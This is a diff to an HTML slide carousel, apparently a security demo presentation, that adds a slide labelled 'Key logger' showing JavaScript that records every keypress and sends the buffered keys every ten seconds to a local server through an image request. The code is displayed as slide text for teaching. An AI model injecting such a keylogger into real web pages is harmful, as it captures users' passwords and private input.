@@ -283,6 +283,31 @@
             </div>
         </div>
         <div class="carousel-item">
+            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
+                <div class="row align-items-end">
+                    <div class="col align-self-center">
+                        <h2>//############# KEY LOGGER ######################</h2>
+                        <h2><br></h2>
+                        <h2>var keys_ = '';</h2>
+                        <h2>document.onkeypress = function(e) {</h2>
+                        <h2>&nbsp;&nbsp;get = window.event?event:e;</h2>
+                        <h2>&nbsp;&nbsp;key = get.keyCode?get.keyCode:get.charCode;</h2>
+                        <h2>&nbsp;&nbsp;key = String.fromCharCode(key);</h2>
+                        <h2>&nbsp;&nbsp;keys_+=key;</h2>
+                        <h2>}</h2>
+                        <h2>window.setInterval(function(){</h2>
+                        <h2>&nbsp;&nbsp;if(keys_.length > 0) {</h2>
+                        <h2>&nbsp;&nbsp;&nbsp;&nbsp;new Image().src = 'http://localhost:9020/imgkey/'+keys_;</h2>
+                        <h2>&nbsp;&nbsp;&nbsp;&nbsp;keys_ = '';</h2>
+                        <h2>&nbsp;&nbsp;}</h2>
+                        <h2>}, 10000);</h2>
+                        <h2><br></h2>
+                        <h2>//############# KEY LOGGER  ######################</h2>
+                        <h2><br></h2>
+                        <h2>C:\dev\soft\nginx\logs</h2>
+                    </div>
+                </div>
+            </div>
             <div class="carousel-caption d-none d-md-block">
                 <h5>Key logger</h5>
             </div>
